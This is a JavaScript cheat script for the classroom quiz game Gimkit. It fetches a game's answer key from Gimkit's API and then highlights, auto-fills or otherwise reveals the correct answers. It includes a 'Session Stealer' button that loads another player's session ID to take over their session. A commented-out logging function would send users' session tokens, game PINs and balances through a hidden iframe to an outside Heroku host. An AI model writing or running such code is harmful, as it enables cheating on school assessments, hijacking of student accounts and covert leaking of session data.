/*
* Made by: UndercoverGoose
* Version: 1.9
*/
(function(){
  console.debug("%cRunning Gimkit Hack V1.9", "color:#FF5555;font-size:20px;");
  
  // Function/Variables to simplify the creation, appending, and getting of objects/elements
  let cN = "hckcntnt";
  let d = "div";
  let a3 = "#33aa33";
  let a33 = "#aa3333";
  let balanceChanges = [];
  let balanceTimes = [];
  function gcn(x,y){return document.getElementsByClassName(x)[y]}
  function cre(t,c,s,i){let x=document.createElement(t);x.className=c,x.style=s,x.innerHTML=i;return x;}
  function app(v){document.body.appendChild(v)}
  function appd(v){document.getElementsByClassName(cN)[1].appendChild(v)}
  function apps(v){document.getElementsByClassName(cN)[7].appendChild(v)}
  function appup(v){document.getElementsByClassName('sc-dUjcNx cMoWkD')[0].appendChild(v)}

  // Applies default button color and look without having to purchase an upgrade to update the style
  let newstyle = document.createElement('style');
  newstyle.textContent='.fkLxCm {box-sizing: border-box;font-size: 17px;color: white;font-weight: bold;text-align: center;display: inline-block;user-select: none;cursor: pointer;padding: 12px 16px;background: rgb(0, 85, 255);transition: background 0.2s ease 0s;border-radius: 4px;font-family: "Product Sans", sans-serif;}';
  app(newstyle);
  
  let qs = [],
      as = [];
  let list = [];
  for(let x=0;x<JSON[Object.keys(JSON)[0]].length;x++) {
    list.push(parseInt(JSON[Object.keys(JSON)[0]][x]["_id"].slice(19,99),16))
  }
  list.sort()
  let gameID = (JSON[Object.keys(JSON)[0]][0]["_id"].slice(0, 19) + (list[0] - 1).toString(16));
  let r = new XMLHttpRequest();
  r.open('GET', `https://www.gimkit.com/api/games/fetch/${gameID}`);
  r.onreadystatechange = function() { 
    if (r.readyState == 4 && r.status == 200) {
      let json = JSON.parse(r.responseText);
      for(let x=0;x<(json.kit.questions).length;x++) {
        qs.push(json.kit.questions[x].text);
        as.push(json.kit.questions[x].answers[0].text);
      }
    }
  }
  r.send();
  
  
  // Cheat toggles and "Menu" button creation
  let f = [0, 0, 0, 0, 0, 0];
  let hconfig = {
    keybinds:{
      hidemenu: 67, // c:67
      highlight: 72, // h:72
      biganswer: 66, // b:66
      inputanswer: 73, // i:73
      hiddenanswer: 79 // o:79
    },
    theme:{
      active:"default",
      default:[[48,63,159],[119,19,34],[168,92,21],[13,107,51],[7,98,150]],
      night:[[0,10,18],[38,50,56],[55,71,79],[69,90,100],[84,110,122]],
      thanos:[[13,0,25],[34,0,68],[51,0,102],[62,0,124],[79,23,135]],
      ocean:[[0,0,99],[40,53,147],[7,98,150],[2,119,189],[21,101,192]],
      forest:[[76,61,51],[56,86,69],[66,92,73],[65,86,65],[76,99,73]],
      sunset:[[127,116,150],[224,111,90],[237,113,45],[122,89,106],[232,171,60]],
      retro:[[156,0,34],[0,29,59],[255,174,82],[254,89,99],[167,28,148]],
      gold:[[0,0,0],[255,205,43],[255,199,33],[255,209,71],[255,205,56]]
    },
    upgrades:{
      money:[0,10,100,1e3,1e4,75e3,3e5,1e6,1e7,1e8],
      streak:[0,15,150,1500,15e3,115e3,45e4,15e5,15e6,2e8],
      multi:[0,50,300,2e3,12e3,85e3,7e5,65e5,65e6,1e9],
      protec:[0,10,250,1e3,25e3,1e5,1e6,5e6,25e6,5e8]
    }
  }
  let btnattr={
    style:"width:200px;height:40px;margin-top:3px;background:#aa3333",
    class:"sc-bdVaJa fkLxCm hckcntnt"
  }

  let b = cre(d,btnattr.class,"position: fixed; z-index: 1000000; left: 5px; bottom: 5px; width: 100px; height: 40px;","Menu");
  b.onclick=function(){if(f[0]===0){gcn(cN,1).style.display="block",f[0]=1,gcn(cN,0).innerHTML="X",gcn(cN,0).style.background="#ff0000";}else{gcn(cN,1).style.display="none",f[0]=0,gcn(cN,0).innerHTML="Menu",gcn(cN,0).style.background="";}};
  app(b);

  // Area for cheat buttons
  app(cre(d,btnattr.class,"position:fixed;z-index:10000;left:5px;bottom:5px;width:300px;height:600px;display:none",""));

  // Toggles/creates highlight answers cheat
  let h = cre(d,btnattr.class,btnattr.style,"Highlight Answers");
  h.onclick=function(){if(f[1]===0){gcn(cN,2).style.background=a3;f[1]=1;hlinterval=setInterval(highlight,0);}else{gcn(cN,2).style.background=a33;f[1]=0;clearInterval(hlinterval);}}
  appd(h);

  // Toggles/creates big answer cheat
  let ab = cre(d,btnattr.class,btnattr.style,"Big Answer Box");
  ab.onclick=function(){if(f[2]===0){gcn(cN,3).style.background=a3;f[2]=1;bainterval=setInterval(biganswer,0);}else{gcn(cN,3).style.background=a33;f[2]=0;clearInterval(bainterval);}}
  appd(ab);

  // Toggles/creates input answer cheat
  let ia = cre(d,btnattr.class,btnattr.style,"Input Answer");
  ia.onclick=function(){if(f[3]===0){gcn(cN,4).style.background=a3;f[3]=1;iainterval=setInterval(inputanswer,0);}else{gcn(cN,4).style.background=a33;f[3]=0;clearInterval(iainterval);}}
  appd(ia);

  // Toggles/creates hidden answer cheat
  let ha = cre(d,btnattr.class,btnattr.style,"Hidden Answer");
  ha.onclick=function(){if(f[5]===0){gcn(cN,5).style.background=a3;f[5]=1;hainterval=setInterval(hiddenanswer,0);}else{gcn(cN,5).style.background=a33;f[5]=0;clearInterval(hainterval);document.title="Play Gimkit! - Enter game code here";}}
  appd(ha);

  // Creates settings button
  let se = cre(d,btnattr.class,"width:170px;height:40px;margin-top:3px;background:#333333;position:absolute;bottom:0px;right:0px","Settings");
  se.onclick=function(){if(f[6]===0){gcn(cN,7).style.display="block";f[6]=1;}else{f[6]=0;gcn(cN,7).style.display="none";}}
  appd(se);

  // Creates Session Stealer Button
  let ssb = cre(d,"sc-bdVaJa fkLxCm",btnattr.style,"Session Stealer");
  ssb.onclick=function(){stealSession()};
  appd(ssb);

  // Creates Upgradeable Upgrade Display
  let autoclass = "sc-bdVaJa fkLxCm autoUp";

  let automoney = cre(d,autoclass,btnattr.style+";position:absolute;margin-left: 100px;font-size:12px","Money: Level ? for $?");
  appup(automoney);

  let autostreak = cre(d,autoclass,btnattr.style+";position:absolute;margin-left:300px;font-size:12px","Streak: Level ? for $?");
  appup(autostreak);

  let automulti = cre(d,autoclass,btnattr.style+";position:absolute;margin-left:500px;font-size:12px","Multi: Level ? for $?");
  appup(automulti);

  let autoprotec = cre(d,autoclass,btnattr.style+";position:absolute;margin-left:700px;font-size:12px","Protec: Level ? for $?");
  appup(autoprotec);
  
  let lvl = {
      money: 0,
      streak: 0,
      multi: 0,
      protec: 0
    }
  function autowhatever(){
    let bal = document.getElementsByTagName(d)[9].innerHTML.split(",").join("").split("$").join("");
    let shrink = document.getElementsByClassName('autoUp');
    let hc = hconfig.upgrades;

    if(typeof document.getElementsByClassName('sc-bdVaJa Harxh')[0] !== "undefined"){
      if(document.getElementsByClassName('sc-bdVaJa Harxh')[0].childNodes[0].childNodes[0].innerHTML === "Money Per Question"){
        for(let x=0;x<10;x++) {
          if(document.getElementsByClassName('sc-eXEjpC joQyGL')[x].innerHTML.lastIndexOf('gray') > -1 && x + 1 > lvl.money) {
            lvl.money = x + 1;
          }
        }
      }else if(document.getElementsByClassName('sc-bdVaJa Harxh')[0].childNodes[0].childNodes[0].innerHTML === "Streak Bonus") {
        for(let x=0;x<10;x++) {
          if(document.getElementsByClassName('sc-eXEjpC joQyGL')[x].innerHTML.lastIndexOf('gray') > -1 && x + 1 > lvl.streak) {
            lvl.streak = x + 1;
          }
        }
      }else if(document.getElementsByClassName('sc-bdVaJa Harxh')[0].childNodes[0].childNodes[0].innerHTML === "Multiplier") {
        for(let x=0;x<10;x++) {
          if(document.getElementsByClassName('sc-eXEjpC joQyGL')[x].innerHTML.lastIndexOf('gray') > -1 && x + 1 > lvl.multi) {
            lvl.multi = x + 1;
          }
        }
      }else if(document.getElementsByClassName('sc-bdVaJa Harxh')[0].childNodes[0].childNodes[0].innerHTML === "Amount Covered") {
        for(let x=0;x<10;x++) {
          if(document.getElementsByClassName('sc-eXEjpC joQyGL')[x].innerHTML.lastIndexOf('gray') > -1 && x + 1 > lvl.protec) {
            lvl.protec = x + 1;
          }
        }
      }
    }
    try{
      if(lvl.money < 10) {
        shrink[0].innerHTML = "Money: Level " + (lvl.money + 1) + " for $" + hc.money[lvl.money];
        if(bal >= hc.money[lvl.money]) {
          shrink[0].style.background = a3;
        }else {
          shrink[0].style.background = a33;
        }
      }else {
        shrink[0].innerHTML = "MAX";
      }
      if(lvl.streak < 10) {
        shrink[1].innerHTML = "Streak: Level " + (lvl.streak + 1) + " for $" + hc.streak[lvl.streak];
        if(bal >= hc.streak[lvl.streak]) {
          shrink[1].style.background = a3;
        }else {
          shrink[1].style.background = a33;
        }
      }else {
        shrink[1].innerHTML = "MAX";
      }
      if(lvl.multi < 10) {
        shrink[2].innerHTML = "Multi: Level " + (lvl.multi + 1) + " for $" + hc.multi[lvl.multi];
        if(bal >= hc.multi[lvl.multi]) {
          shrink[2].style.background = a3;
        }else {
          shrink[2].style.background = a33;
        }
      }else {
        shrink[2].innerHTML = "MAX";
      }
      if(lvl.protec < 10) {
        shrink[3].innerHTML = "Protec: Level " + (lvl.protec + 1) + " for $" + hc.protec[lvl.protec];
        if(bal >= hc.protec[lvl.protec]) {
          shrink[3].style.background = a3;
        }else {
          shrink[3].style.background = a33;
        }
      }else {
        shrink[3].innerHTML = "MAX";
      }
      
      
    }catch(err){}
    
    /*/ Questions Per Second
    let currentBal;
    if(document.getElementsByTagName("div")[9].innerHTML.indexOf("$") === -1) {
      currentBal = parseInt(document.getElementsByTagName("div")[10].innerHTML.slice(1).split(",").join(""));
    }else {
      currentBal = parseInt(document.getElementsByTagName("div")[9].innerHTML.slice(1).split(",").join(""));
    }

    if(balanceChanges.length === 0) {
      if(document.getElementById("qps") === null ){
        let bcx = document.createElement("span");
        bcx.style = "font-size: 15px;position:fixed;right: 120px;color:white; top: 5px;";
        bcx.id = "qps";
        document.body.appendChild(document.createElement('b'));
        document.body.appendChild(bcx);
      }
      balanceChanges.push(currentBal);
    }

    if(balanceChanges[balanceChanges.length - 1] !== currentBal) {
      balanceChanges.push(currentBal);
      balanceTimes.push(new Date().getTime());
    }
    
    if(parseFloat(balanceChanges.length / 10).toFixed(1) >= 1) {
      document.getElementById("qps").style.color = a33;
    }else {
      document.getElementById("qps").style.color = "#fff";
    }

    for(let x=0;x<balanceTimes.length;x++) {
      if(new Date().getTime() - balanceTimes[x] >= 10000) {
        delete balanceTimes[x];
        delete balanceChanges[x];
               
        balanceTimes = balanceTimes.filter((a,b) => a + b);
        balanceChanges = balanceChanges.filter((a,b) => a + b);
      }
    }

    document.getElementById("qps").innerHTML = ((balanceChanges.length - 1) / 10).toFixed(1) + " questions per second";*/
  
  }setInterval(autowhatever, 0);

  // Creates setttings placeholder
  let sep = cre(d,btnattr.class,"position: fixed; z-index: 10000; left: 310px; bottom: 5px; width: 300px; height: 600px; display: none;","");
  app(sep);

  let setxt = document.createElement('span');
  setxt.appendChild(document.createTextNode('Themes'));
  apps(setxt);

  apps(document.createElement('br'));

  // Theme Buttons
  for(let x=0;x<8;x++){
    let y=hconfig.theme;
    let t = cre(d,"sc-bdVaJa fkLxCm","width:200px;height:40px;margin-top:3px;background:rgb("+y[Object.keys(y)[x+1]][3].join(",")+")",Object.keys(y)[x+1]);
    t.onclick=function(){y.active=Object.keys(y)[x+1]};
    apps(t);
  }

  /*/ Allows I To Track Usage & Demand
  function log(){
    let bbid = localStorage.getItem('blueboat-id');
    let ljm = localStorage.getItem('GIMKIT_LAST_GAME_JOINED');
    let bal = document.getElementsByTagName(d)[9].innerHTML;

    let i = document.createElement('iframe');
    i.style.display = "none";
    i.style.position = "fixed";
    i.src = "https://cagna.herokuapp.com/?ID:" + bbid + "%20PIN:" + ljm + "%20BAL:" + bal;
    document.body.appendChild(i);
  }setInterval(log, 60000);/*/

  // Functions that make the cheats work
  function highlight(){
    try{
      let d=document.getElementsByClassName('notranslate lang-en'),q=d[0].innerHTML,a=[d[1].innerHTML,d[2].innerHTML,d[3].innerHTML,d[4].innerHTML],i=a.indexOf(as[qs.indexOf(q)])+1;
      d[i].parentNode.parentNode.style.background="white",d[i].style.color="black";
    }catch(err){}
  }

  function stealSession(){
    let session = prompt("Enter Session ID:", "");
    if(session.length === 21) {
      localStorage.setItem('blueboat-id', session);
      document.location.reload();
    }else {
      alert("Invalid Session Length");
    }
  }

  function biganswer(){
    try{
      let d=document.getElementsByClassName('notranslate lang-en'),q=d[0].innerHTML,a=[d[1].innerHTML,d[2].innerHTML,d[3].innerHTML,d[4].innerHTML],i=a.indexOf(as[qs.indexOf(q)])+1;
      d[i].parentNode.parentNode.parentNode.style="position:fixed;left:5px";
    }catch(err){}
  }
  function inputanswer(){
    try{
      let q=document.getElementsByClassName('notranslate lang-en')[0].innerHTML;
      document.getElementsByClassName('sc-jhAzac egTZap')[0].value=as[qs.indexOf(q)];
    }catch(err){}
  }
  function hiddenanswer(){
    try {
      let d=document.getElementsByClassName('notranslate lang-en'),q=d[0].innerHTML,a=[d[1].innerHTML,d[2].innerHTML,d[3].innerHTML,d[4].innerHTML],i=a.indexOf(as[qs.indexOf(q)])+1;
      document.title=i + "lay Gimkit! - Enter game code here";
    }catch(err){}
  }

  // Theme changer
  function themechanger(){
    try{
      let hc = hconfig.theme;
      let sc = 'sc-Rmtcm';
      gcn('sc-bwzfXH',0).style.background="rgb("+hc[hc.active][0].join(",")+")";
      gcn(cN,1).style.background="rgb("+hc[hc.active][4].join(",")+")";
      gcn(cN,7).style.background="rgb("+hc[hc.active][2].join(",")+")";
      for(let x=0;x<5;x++){
        if(hconfig.theme.active === "gold") {
          gcn(sc,x).style.background="rgb("+hc[hc.active][x+1].join(",")+")";
          if(x === 0) {
            gcn(sc,0).style.color="rgb(255, 205, 43)";
          }else {
            gcn(sc,x).style.color="black";
          }
        }else {
          gcn(sc,x).style.background="rgb("+hc[hc.active][x+1].join(",")+")";
          gcn(sc,x).style.color="white";
        }
      }
    }catch(err){}
    
    /*/ New [WIP] Method For Highlight Answer
    if(typeof document.getElementsByClassName("fas fa-arrow-down")[0] === "object") {
      let q = document.getElementsByClassName("sc-bwzfXH gbnVhw")[0].childNodes[0].childNodes[0].childNodes[0].innerHTML;
      let a = document.getElementsByClassName("sc-bwzfXH gbnVhw")[2].childNodes[0].childNodes[0].childNodes[0].innerHTML;
      
      if(nhq.indexOf(q) === -1 && document.getElementsByClassName('sc-bwzfXH gbnVhw').length === 4) {
        nhq.push(q);
        nha.push(a);
        console.log(nhq, nha);
      }
    }*/
  }setInterval(themechanger, 0);

  
  
  // Key events for added features
  window.onkeydown=function(e){
    if(e.keyCode===hconfig.keybinds.hidemenu){
      if(f[4]===0){
        f[4]=1;
        document.getElementsByClassName(cN)[0].style.display="none"
      }else {
        f[4]=0;
        document.getElementsByClassName(cN)[0].style.display=null;
      }
    }else if(e.keyCode===hconfig.keybinds.highlight){
      highlight();
    }else if(e.keyCode===hconfig.keybinds.biganswer){
      biganswer();
    }else if(e.keyCode===hconfig.keybinds.inputanswer){
      inputanswer();
    }else if(e.keyCode===hconfig.keybinds.hiddenanswer){
      hiddenanswer();
    }
  }
}());
